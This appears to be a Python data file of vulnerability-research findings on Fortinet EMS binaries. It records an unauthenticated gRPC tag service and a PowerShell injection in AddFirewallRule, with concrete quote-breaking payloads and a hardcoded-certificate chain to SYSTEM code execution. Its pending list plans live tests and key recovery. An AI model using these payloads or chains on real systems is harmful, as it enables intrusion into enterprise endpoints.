        "handler":   "pb._TagService_Tag_Handler (va=0x011d7e60) -- gRPC dispatcher",
        "impl":      "service.(*TagService).Tag (va=0x0131fbe0) -- actual tag processing",
        "transport": "gRPC over TLS port 9990 (ecsocksrv forwards here from FortiClient)",
    },

    "analysis": {
        "prologue": (
            "service.(*TagService).Tag allocates 0x948 bytes stack frame. "
            "First call (0x43f9e0) = runtime.deferprocStack -- pushes recover() defer. "
            "Two interface dispatch calls (call rcx via [rcx+0x28]) are context operations, "
            "NOT auth checks -- pattern matches ctx.Value() / metadata extraction."
        ),
        "processing_body": (
            "At 0x131fdb6 (success path): reads TagRequest.field_0x28 (string), calls strings.ToUpper, "
            "calls setDefaultVdomIfEmpty (fortinet.com/ems/service.setDefaultVdomIfEmpty = va 0x12e9940), "
            "calls log.Debug for field logging. "
            "No HMAC computation, no signature verify, no token check observed before field access."
        ),
        "missing_checks": [
            "No call to crypto/hmac.*",
            "No call to crypto/sha256.*",
            "No JWT verify in TagService.Tag body",
            "No peer certificate check against expected client identity",
            "setDefaultVdomIfEmpty accepts VDOM from TagRequest without validation",
        ],
    },

    "impact": (
        "Attacker who can reach port 9990 (or who controls ecsocksrv via EMS-F19 MITM) can submit "
        "a crafted gRPC TagRequest with a forged VDOM assignment or posture tag. "
        "If accepted, the forged tag alters ZTNA policy enforcement state for the targeted endpoint "
        "without the endpoint actually passing posture checks."
    ),

    "grpc_server_config": {
        "call":    "grpc.NewServer at 0x013e2036 in (*GrpcServer).Start",
        "options": [
            "grpc.NumStreamWorkers(N)           -- concurrency tuning, no security impact",
            "grpc.MaxConcurrentStreams(M)        -- rate limit, no security impact",
            "grpc.UnaryInterceptor(server.QueueLimitInterceptor)  -- queue rate limiting ONLY, no auth",
        ],
        "absent":  [
            "grpc.Creds()        -- not in symbol table; no server-side TLS credential object",
            "auth interceptor    -- no JWT/token/cert/HMAC check anywhere in option list",
        ],
        "note": "grpc.Creds absent from entire binary COFF symbol table -- not compiled in as server option.",
    },

    "impact": (
        "Any host that can reach ztnaworker port 9990 can submit arbitrary ZTNA posture tags. "
        "No authentication, no TLS, no signature check. Attacker path: "
        "(1) Internal network access to port 9990 directly, OR "
        "(2) Exploit EMS-F19 hardcoded cert to MITM ecsocksrv on port 8013, then forward forged "
        "TagRequests to port 9990. "
        "Result: forged VDOM assignment and posture tags alter ZTNA enforcement state "
        "without the endpoint actually passing compliance checks."
    ),
}


# EMS-F22: AddFirewallRule PowerShell injection via unsanitized ZTNA policy fields
EMS_F22_ADDFIREWALLRULE_PS_INJECTION = {
    "id":       "EMS-F22",
    "title":    "ztnaworker.exe AddFirewallRule injects unsanitized ZTNA policy strings into PowerShell script",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "cvss_score": 10.0,
    "cwe":      "CWE-78 (Improper Neutralization of Special Elements used in an OS Command)",
    "status":   "CONFIRMED -- format string and exec.Command args recovered from rodata; no sanitization in call path",
    "binary":   "ztnaworker.exe (PE32+ Go, 34MB, port 9990) + goEMSCommon common.AddFirewallRule",

    "locations": {
        "AddFirewallRule": {
            "symbol": "fortinet.com/goEMSCommon/common.AddFirewallRule",
            "va":     "0x010f48c0",
        },
        "enableFirewallRule": {
            "symbol": "fortinet.com/ems/service/ec/ecs.enableFirewallRule",
            "va":     "0x013ddb20",
            "call_to_AddFirewallRule": "0x013ddbc0",
        },
        "exec_Command_call": {
            "va":   "0x010f4c20",
            "note": "exec.Command(getPowershell(), '-NoProfile', '-NonInteractive', fmt_Sprintf_output)",
        },
        "exec_Cmd_Run_call": {
            "va":   "0x010f4cb1",
        },
    },

    "format_string": {
        "va":     "0x01671C7D",
        "length": 419,
        "content": (
            "\n$name = '%s';\n$group = '%s';\n$path = '%s';\n$port = %d;\n$proto = '%s';\n"
            "$existing = (Get-NetFirewallRule -DisplayName $name).Length 2>$null;\n"
            "if ( $existing -ne 0 ) {\n"
            "\tRemove-NetFirewallRule -DisplayName $name;\n"
            "}\n\n"
            "New-NetFirewallRule -DisplayName $name -Group $group -Program $path "
            "-LocalPort $port -Direction Inbound -Action Allow -Protocol $proto "
            "-Description \"Allow inbound communication to $name on port $port\";\n\nexit"
        ),
        "ps_args": {
            "arg0_va": "0x0161A418",
            "arg0":    "-NoProfile",
            "arg1_va": "0x0161FFE3",
            "arg1":    "-NonInteractive",
        },
    },

    "sprintf_args": {
        "%s_name":  {
            "source": "caller arg (rax/rbx) -- originates from ZTNA policy or tag data",
            "static": False,
            "injectable": True,
            "note": "single-quoted in PS: $name = '%s'. Single-quote injection: pass \"'\\'; Invoke-Expression '<cmd>'; #\" to execute arbitrary PS.",
        },
        "%s_group": {
            "source": "rcx = static literal 'FortiClient Endpoint Manager Network Services' (45 chars)",
            "static": True,
            "injectable": False,
        },
        "%s_path":  {
            "source": "caller arg -- program path from ZTNA policy enforcement context",
            "static": False,
            "injectable": True,
            "note": "single-quoted: $path = '%s'. Path value from ZTNA policy; endpoint can claim arbitrary path.",
        },
        "%d_port":  {
            "source": "caller arg -- integer via %d format; not injectable as string",
            "static": False,
            "injectable": False,
        },
        "%s_proto": {
            "source": "r10 = static literal 'TCP' (3 chars)",
            "static": True,
            "injectable": False,
        },
    },

    "injection_vector": {
        "method":  "PowerShell script text injection via fmt.Sprintf with single-quote delimiters",
        "payload": "name_field = \"'; Start-Process cmd.exe -ArgumentList '/c <evil>' -WindowStyle Hidden; $x = '\"",
        "result":  "PS script becomes: $name = ''; Start-Process cmd.exe ...; $x = ''; (arbitrary code)",
        "no_sanitization": [
            "No call to strings.ReplaceAll for single quotes in AddFirewallRule body",
            "No call to html.EscapeString, url.QueryEscape, or any encoder before Sprintf",
            "No call to any sanitize/escape function in enableFirewallRule or AddFirewallRule",
        ],
    },

    "actual_call_chain": {
        "chain": [
            "(*ECSocketServerService).Serve (port 8013 ecsocksrv) -- receives EC message from FortiClient",
            "Serve.func2 (va=0x013D7A00) -- goroutine closure; args from closure struct fields +0x8, +0x10, +0x18",
            "enableFirewallRule (va=0x013DDB20) -- passes name/path from closure to AddFirewallRule",
            "AddFirewallRule (va=0x010F48C0) -- builds PS script with fmt.Sprintf, executes via exec.Command",
        ],
        "entry_point": "port 8013 (EC socket server, not port 9990 ZTNA gRPC)",
        "closure_fields": {
            "+0x8 / +0x10": "name string (ptr, len) -- firewall rule display name from EC message",
            "+0x18":         "path/additional arg from EC message -- used as enableFirewallRule third arg",
        },
        "chain_with_EMS_F19": (
            "EMS-F19 (hardcoded defaultCert/defaultKey for port 8013 TLS) enables attacker impersonation: "
            "use defaultCert to authenticate to port 8013 as a FortiClient endpoint -> "
            "send EC policy message with PS payload as rule name or program path -> "
            "Serve.func2 -> enableFirewallRule -> AddFirewallRule executes PS -> SYSTEM RCE."
        ),
        "note": (
            "EMS-F21 (port 9990, no auth TagService.Tag) does NOT directly call enableFirewallRule. "
            "The injection chain runs through port 8013 ecsocksrv (ecsocksrv == ECSocketServerService). "
            "Prerequisite: EMS-F19 hardcoded cert OR a compromised FortiClient endpoint. "
            "PENDING: determine if closure args (name, path) originate from EC protocol message body "
            "(client-controlled, pre-auth with EMS-F19 cert) or from EMS policy config DB "
            "(admin-controlled). If client-controlled: severity CRITICAL pre-auth RCE. "
            "If admin-controlled: severity HIGH priv-esc from EMS admin to SYSTEM."
        ),
    },

    "privilege": "SYSTEM -- ztnaworker.exe runs as Windows service under SYSTEM account",
}


# ---------------------------------------------------------
# Pending analysis (UPDATED)
# ---------------------------------------------------------
PENDING = [
    # Crypto / key material
    "EMS-F17: Confirm ca.crt (Apache EMS CA) is shipped vs per-installation; if shipped, recover or confirm CA private key location",
    "EMS-F16/F17/F18/F19: Chain live test -- use decrypted defaultKey + defaultCert to authenticate to live EMS as FortiClient device",
    # RESOLVED: getKeyPass = SCHEME-1 XOR (defaultCertPassEnc XOR defaultCertPassKey); port 8013 TLS server cert = defaultCert (EMS-F19)
    "EMS-F5: --keypass for CA private key (FcmDaemon.exe AES-256-CBC key) still unresolved -- check service registry, installer custom action DLL, or process memory",
    "EMS-F18: Determine if deriveKey/gcm PBKDF2 path (16384 iter, dasSalt) is used for any external-facing surface (DAS channel at 127.0.0.1:65432 is localhost-only)",

    # Protocol / binary RE
    "EMS-F15: Determine runSrvCmd semantics -- what service commands are valid and what they execute",
    "EMS-F13: Determine regPwd semantics -- AD machine account password vs EMS-issued shared secret vs per-device",
    "EMS-F14: Confirm rogue EMS auth redirect on live instance -- does FortiClient accept authSAMLURL from server",
    "Port 8013 startUnprotectedListener: identify conditions that trigger non-TLS path in socket_server.go",
    "ztnaworker.exe RE: COMPLETE for EMS-F20/F21/F22 -- remaining: trace NewGrpcConnPool target host to identify what it connects to",
    "sipdaemon.exe RE: COMPLETE -- binary is IDENTICAL to ztnaworker.exe (same 3700 fortinet symbols, 0 unique); 4 syms unique to ztnaworker.exe only: server.WithFOS, server.WithRedis and their .func1 variants. All EMS-F20/F21/F22 findings apply to sipdaemon.exe equally. Binary is 34,386,048 bytes (ztnaworker: 34,389,632 = 3584 bytes diff = exactly the WithFOS/WithRedis delta).",

    # Django application RE
    "EMS-F2: Confirm CONTENT_DIRECTORY value; ContentDict may be whitelist not open path join",
    "EMS-F6: Confirm _check_certificate_chain_is_valid() scope -- does Django re-verify against CA?",
    "EMS-F9: Confirm inv_only_reg_enforcement_type default value -- is open registration the default?",
    "EMS-F11: Test XSW attack payloads against ^saml/acs/ endpoint on live EMS instance",
    "auth_helpers.pyc: analyze shared auth primitives used by all three auth paths",
    "support_package endpoint: check if archive includes settings.py, keys, or DB credentials",

    # Installer / key material
    "EMS-F5: Recover --keypass from EMS Windows service registry or installer custom action DLL",
    "MSI Binary table: extract C# custom action DLL to confirm or deny EMS-F1 SECRET_KEY rewrite",

    # Other Fortinet products
    "FortiClient VPN 7.2.10 -- start extraction and RE",
    "FAZ VM64 -- pending flatkc key for encrypted rootfs",
    "FortiGate VM64 -- pending flatkc key",
]
